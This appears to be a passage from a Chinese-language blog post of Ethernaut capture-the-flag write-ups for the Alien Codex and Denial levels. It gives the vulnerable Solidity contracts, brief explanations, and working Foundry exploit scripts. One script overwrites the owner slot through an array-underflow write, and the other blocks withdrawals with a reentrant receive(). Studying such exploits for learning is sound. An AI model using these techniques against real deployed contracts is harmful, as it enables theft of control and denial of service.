+<h2 id="Alien-Codex"><a href="#Alien-Codex" class="headerlink" title="Alien Codex"></a>Alien Codex</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &quot;../helpers/Ownable-05.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line">    bool public contact;</span><br><span class="line">    bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">    modifier contacted() &#123;</span><br><span class="line">        assert(contact);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function makeContact() public &#123;</span><br><span class="line">        contact = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function record(bytes32 _content) public contacted &#123;</span><br><span class="line">        codex.push(_content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function retract() public contacted &#123;</span><br><span class="line">        codex.length--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function revise(uint256 i, bytes32 _content) public contacted &#123;</span><br><span class="line">        codex[i] = _content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>因为版本较低，所以说都会出现OvewFlow或者UnderFlow的情况，首先先绕过<code>contacted()</code>呼叫函数<code>makeContact</code>。再使用函数<code>retract()</code>造成UnderFlow的情况。至于如何获得拥有权，合约没有Owner啊?合约继承了<code>Ownable</code>合约如果有继承合约，则被继承合约的 <strong>storage variable</strong> 会存储在原合约之前，也就是 <strong>_owner</strong> 变量将存储在 <strong>slot 0</strong>，接着才按顺序存储 <strong>contact</strong>、<strong>codex</strong>。</p>
+<p>下面是最重要的一步，因为<code>codex</code>动态数组出现了UnderFlow所以,数组的长度是2**256,覆盖了整个空间.现在就是通过修改codex[i]来修改<code>slot0</code>的值,具体的推理看下图.</p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202512201713185.png" alt="image-20251220171350012"></p>
+<h3 id="Exp-3"><a href="#Exp-3" class="headerlink" title="Exp"></a>Exp</h3><p>必须在<code>unchecked</code>条件下,因为版本高的Solidity会自动防止出现溢出的情况</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">interface IAlienCodex &#123;</span><br><span class="line">    function makeContact() external;</span><br><span class="line">    function record(bytes32 _content) external;</span><br><span class="line">    function retract() external;</span><br><span class="line">    function revise(uint256 i, bytes32 _content) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract AlienCodexSolution is Script &#123;</span><br><span class="line">    function run() public &#123;</span><br><span class="line">        vm.startBroadcast();</span><br><span class="line">        AlienAttack attackContract = new AlienAttack(0x96D3dbD3634425BaD084a02fA77eFf21a1Cac4F5);</span><br><span class="line">        attackContract.attack();</span><br><span class="line">        bytes32 leet0 = vm.load(address(attackContract.alienCodex()), bytes32(uint256(0)));</span><br><span class="line">        console.logBytes32(leet0);</span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract AlienAttack &#123;</span><br><span class="line">    IAlienCodex public alienCodex;</span><br><span class="line"></span><br><span class="line">    constructor(address _alienCodexAddress) &#123;</span><br><span class="line">        alienCodex = IAlienCodex(_alienCodexAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external &#123;</span><br><span class="line">        alienCodex.makeContact();</span><br><span class="line">        alienCodex.retract();</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            uint256 i = uint256(2) ** uint256(256) - uint256(keccak256(abi.encode(uint256(1))));</span><br><span class="line">            alienCodex.revise(i, bytes32(uint256(uint160(msg.sender))));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Denial"><a href="#Denial" class="headerlink" title="Denial"></a>Denial</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Denial &#123;</span><br><span class="line">    address public partner; // withdrawal partner - pay the gas, split the withdraw</span><br><span class="line">    address public constant owner = address(0xA9E);</span><br><span class="line">    uint256 timeLastWithdrawn;</span><br><span class="line">    mapping(address =&gt; uint256) withdrawPartnerBalances; // keep track of partners balances</span><br><span class="line"></span><br><span class="line">    function setWithdrawPartner(address _partner) public &#123;</span><br><span class="line">        partner = _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // withdraw 1% to recipient and 1% to owner</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint256 amountToSend = address(this).balance / 100;</span><br><span class="line">        // perform a call without checking return</span><br><span class="line">        // The recipient can revert, the owner will still get their share</span><br><span class="line">        partner.call&#123;value: amountToSend&#125;(&quot;&quot;);</span><br><span class="line">        payable(owner).transfer(amountToSend);</span><br><span class="line">        // keep track of last withdrawal time</span><br><span class="line">        timeLastWithdrawn = block.timestamp;</span><br><span class="line">        withdrawPartnerBalances[partner] += amountToSend;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // allow deposit of funds</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // convenience function</span><br><span class="line">    function contractBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><p>就是简单的Re-entracy造成DOS的漏洞利用。</p>
+<h3 id="Exp-4"><a href="#Exp-4" class="headerlink" title="Exp"></a>Exp</h3><p>interface Idenial {<br>    function withdraw() external;<br>    function setWithdrawPartner(address _partner) external;<br>    function contractBalance() external view returns (uint256);<br>}</p>
+<p>contract DenialSolution is Script {<br>    function run() public {<br>        vm.startBroadcast();<br>        DenialAttack attackContract &#x3D; new DenialAttack(0x20a7E19aF42B2AAA1Ee5d429B10ABc8c3bcd5746);<br>        attackContract.attack();<br>        vm.stopBroadcast();<br>    }<br>}</p>
+<p>contract DenialAttack {<br>    Idenial public denial;</p>
+<pre><code>constructor(address _denialAddress0) {
+    denial = Idenial(_denialAddress0);
+}
+
+function attack() external {
+    denial.setWithdrawPartner(address(this));
+}
+
+receive() external payable {
+    denial.withdraw();
+}
+</code></pre>
+<p>}</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>D3
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="http://example.com/2026/02/02/ethernaut3/" title="Ethernaut 16-20">http://example.com/2026/02/02/ethernaut3/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Web3-Security/" rel="tag"># Web3 Security</a>
+              <a href="/tags/Ethernaut/" rel="tag"># Ethernaut</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/01/29/ethernautP2/" rel="prev" title="Ethernaut 11-15">
+                  <i class="fa fa-angle-left"></i> Ethernaut 11-15
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">D3</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
